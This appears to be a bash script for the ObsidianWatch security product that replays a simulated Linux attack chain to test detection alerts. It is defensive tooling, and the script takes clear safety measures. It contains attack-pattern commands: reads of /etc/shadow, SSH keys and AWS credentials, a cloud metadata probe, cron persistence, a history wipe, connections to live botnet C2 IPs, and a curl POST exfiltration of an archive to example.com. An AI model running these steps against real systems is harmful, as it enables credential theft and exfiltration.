#!/usr/bin/env bash
# ObsidianWatch — Linux detection story (attack-chain simulation)
#
# Replays a realistic intrusion on THIS host so you can watch the real
# detections, alerts, IOC matching and the Alert Graph react:
#
#   dropper -> staged binary in /tmp -> test-malware file (EICAR) ->
#   contact with currently-listed C2 IPs -> lookups of listed malware domains ->
#   discovery -> credential-file access -> persistence (cron) ->
#   defence evasion -> archive + upload of (harmless) files
#
# SAFE BY DESIGN
#   * No malware. The "malicious hash" is the EICAR antivirus test file: inert
#     text that every AV / VirusTotal flags (sha256 275a021b...fd0f).
#   * Flagged IPs: it only OPENS a TCP connection (SYN, 8s timeout, no data sent)
#     to IPs currently on abuse.ch's Feodo Tracker C2 blocklist, then closes it.
#     Flagged domains: DNS lookup only, no connection.
#   * Everything it creates is /tmp/.ow_* and is removed on exit. Your crontab is
#     backed up and restored. No root, no sudo, no system files are modified.
#   * The "exfiltration" uploads two harmless files (/etc/hostname, /etc/os-release)
#     to example.com. SSH keys and other secrets are NEVER read into the upload.
#
# Run as a normal user on a host that has the ObsidianWatch Linux agent:
#     bash tools/linux_detection_story.sh
# Options (env):  OW_YES=1 skip the prompt   OW_HOLD=8 seconds each step stays
#   alive (the agent polls processes, so keep >= its poll interval)
#   OW_IPS="1.2.3.4:443 5.6.7.8:8080"  use these flagged IPs instead of the feed
#   OW_DOMAINS="bad1.example bad2.example"  use these flagged domains
set -u
HOLD="${OW_HOLD:-8}"
W=/tmp/.ow_story
STAMP="$(date +%H:%M:%S)"
CRON_BAK=""; CRON_HAD=0; CRON_TOUCHED=0

say()  { printf '\n\033[1;36m[%s] %s\033[0m\n' "$(date +%H:%M:%S)" "$*"; }
note() { printf '    \033[0;37m-> expect: %s\033[0m\n' "$*"; }
hold() { sleep "$HOLD"; }

cleanup() {
  say "Cleaning up"
  rm -rf "$W" /tmp/.ow_dl /tmp/.ow_agent /tmp/.ow_suid /tmp/.ow_loot.tgz /tmp/ow_eicar.com 2>/dev/null
  if [ "$CRON_TOUCHED" = 1 ] && command -v crontab >/dev/null 2>&1; then
    if [ "$CRON_HAD" = 1 ]; then crontab "$CRON_BAK" 2>/dev/null; else crontab -r 2>/dev/null; fi
    echo "    crontab restored"
  fi
  [ -n "$CRON_BAK" ] && rm -f "$CRON_BAK"
  echo "    done."
}
trap cleanup EXIT INT TERM

if [ "$(id -u)" = 0 ]; then
  echo "Run this as a normal user (not root): it is meant to look like a compromised user account."; exit 1
fi

cat <<BANNER
ObsidianWatch Linux detection story  (host: $(hostname), user: $(id -un))
Takes about 3 minutes. Creates only /tmp/.ow_* files, removed on exit.
Real IOC targets are pulled live from abuse.ch (Feodo Tracker / URLhaus); only a
TCP connect / DNS lookup is made to them, nothing is sent or downloaded from them.
BANNER
if [ "${OW_YES:-}" != 1 ]; then
  read -r -p "Continue? [y/N] " a; [ "$a" = y ] || [ "$a" = Y ] || exit 0
fi
mkdir -p "$W"

# ── 1. Initial access / dropper ───────────────────────────────────────────────
say "1. Dropper: shell pulls a payload into /tmp"
note "Shell Suspicious Execution (T1059.004), curl/wget Suspicious Download (T1105)"
sh -c "curl -s -m 10 -o /tmp/.ow_dl https://example.com/ ; sleep $HOLD"

# ── 2. Staged binary executed from /tmp ──────────────────────────────────────
say "2. Stage and run a binary from /tmp"
note "Executable Run from /tmp (T1059.004, Critical), World-Writable File (T1222.002)"
cp /bin/sleep /tmp/.ow_agent && chmod 777 /tmp/.ow_agent
/tmp/.ow_agent $((HOLD+4)) &
AGENT_PID=$!
sleep 2
say "2b. Set the SUID bit on a copy (privilege-escalation staging)"
note "SUID Bit Set (T1548.001)"
cp /bin/true /tmp/.ow_suid && chmod u+s /tmp/.ow_suid; hold
wait "$AGENT_PID" 2>/dev/null

# ── 3. Known-bad file hash (EICAR test file) ─────────────────────────────────
say "3. Drop the EICAR antivirus test file (hash flagged by every scanner)"
note "File hash lookup (VirusTotal engine, if enabled) and any hash IOC feed; FIM create in /tmp"
P1='X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR'; P2='-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
printf '%s%s' "$P1" "$P2" > /tmp/ow_eicar.com
if command -v sha256sum >/dev/null 2>&1; then
  echo "    sha256: $(sha256sum /tmp/ow_eicar.com | cut -d' ' -f1)"
  echo "    (should be 275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f)"
fi
hold; hold

# ── 4. Flagged IPs: live Feodo Tracker C2 list ───────────────────────────────
say "4. Contact IPs currently on the Feodo Tracker botnet-C2 blocklist"
note "Threat-intel IOC match on destination IP (feed sync must be enabled in Settings)"
IPS="${OW_IPS:-}"
if [ -z "$IPS" ] && command -v python3 >/dev/null 2>&1; then
  IPS="$(curl -s -m 15 https://feodotracker.abuse.ch/downloads/ipblocklist.json 2>/dev/null | python3 -c '
import sys, json
try:
    d = json.load(sys.stdin)
    out = [e["ip_address"] + ":" + str(e.get("port") or 443) for e in d if e.get("ip_address")]
    print(" ".join(out[:3]))
except Exception:
    pass' 2>/dev/null)"
fi
if [ -z "$IPS" ]; then
  echo "    could not fetch the feed. Set OW_IPS=\"ip:port ...\" with IPs from your own Threat Intel page."
else
  for t in $IPS; do
    ip="${t%%:*}"; port="${t##*:}"
    echo "    connecting to $ip:$port (8s, no data sent)"
    python3 - "$ip" "$port" <<'PY'
import socket, sys, time
ip, port = sys.argv[1], int(sys.argv[2])
s = socket.socket(); s.settimeout(8)
try:
    s.connect((ip, port)); time.sleep(5)
except Exception:
    pass
finally:
    s.close()
PY
  done
fi

# ── 5. Flagged domains: DNS lookup only ──────────────────────────────────────
say "5. Resolve malware-hosting domains from URLhaus (lookup only, no connection)"
note "DNS events to listed domains; IOC domain match; Paste/File Sharing Service Contact (T1567)"
DOMS="${OW_DOMAINS:-}"
if [ -z "$DOMS" ]; then
  DOMS="$(curl -s -m 15 https://urlhaus.abuse.ch/downloads/hostfile/ 2>/dev/null | awk '$1=="127.0.0.1"{print $2}' | grep -E '^[A-Za-z]' | head -3 | tr '\n' ' ')"
fi
for d in $DOMS pastebin.com; do
  echo "    lookup $d"; getent hosts "$d" >/dev/null 2>&1; sleep 2
done

# ── 6. Discovery ─────────────────────────────────────────────────────────────
say "6. Discovery on the host"
note "Linux User Enumeration (T1087.001)"
sh -c "id -a; cat /etc/passwd >/dev/null; getent passwd >/dev/null; w >/dev/null; last -n 5 >/dev/null 2>&1; uname -a >/dev/null; sleep $HOLD"
if command -v nmap >/dev/null 2>&1; then
  note "Network Scanning Tool (T1046)"
  nmap -sn 127.0.0.1 >/dev/null 2>&1
fi

# ── 7. Credential access ─────────────────────────────────────────────────────
say "7. Credential-file access (reads are discarded, nothing is copied)"
note "/etc/shadow Read (T1003.008, Critical), SSH Private Key Access (T1552.004), Cloud Credential File Access (T1552.005)"
sh -c "cat /etc/shadow >/dev/null 2>&1; cat \$HOME/.ssh/id_rsa >/dev/null 2>&1; cat \$HOME/.aws/credentials >/dev/null 2>&1; sleep $HOLD"
note "Cloud Metadata Service Access (T1078.004)"
curl -s -m 3 http://169.254.169.254/latest/meta-data/ >/dev/null 2>&1   # cloud metadata probe

# ── 8. Persistence ───────────────────────────────────────────────────────────
say "8. Persistence via cron (restored on exit)"
note "Cron Persistence (T1053.003) via file/config change"
if command -v crontab >/dev/null 2>&1; then
  CRON_BAK="$(mktemp /tmp/.ow_cron.XXXXXX)"
  if crontab -l >"$CRON_BAK" 2>/dev/null; then CRON_HAD=1; fi
  { cat "$CRON_BAK" 2>/dev/null; echo "*/30 * * * * /bin/true # ow-detection-story"; } | crontab - && CRON_TOUCHED=1
  hold
else
  echo "    crontab not installed, skipping"
fi

# ── 9. Defence evasion ───────────────────────────────────────────────────────
say "9. Clear shell history (affects only this throwaway shell)"
note "Log File Deletion or History Wipe (T1070.002, Critical)"
bash -c "history -c; sleep $HOLD"

# ── 10. Collection and exfiltration ──────────────────────────────────────────
say "10. Archive files and upload them (harmless files only)"
note "Archive of Sensitive Directory (T1560), curl POST Data Exfiltration (T1048)"
tar czf /tmp/.ow_loot.tgz /etc/hostname /etc/os-release 2>/dev/null
sh -c "curl -s -m 10 -X POST --data-binary @/tmp/.ow_loot.tgz https://example.com/ >/dev/null; sleep $HOLD"

say "Finished at $(date +%H:%M:%S) (started $STAMP)"
cat <<DONE

Next, give the agent and engines a minute or two, then:
  * Alerts page: filter host $(hostname) — you should see the alerts listed above.
  * Open the Shell / Executable-from-/tmp alert -> Graph tab: this script is the
    parent; its children are the dropper, staged binary, discovery, cron and
    upload steps, with the connections to the listed C2 IPs and domains.
  * Click "Explain this graph with AI" for the model's story.
Anything that did NOT alert is a real finding about coverage: tell me which.
DONE
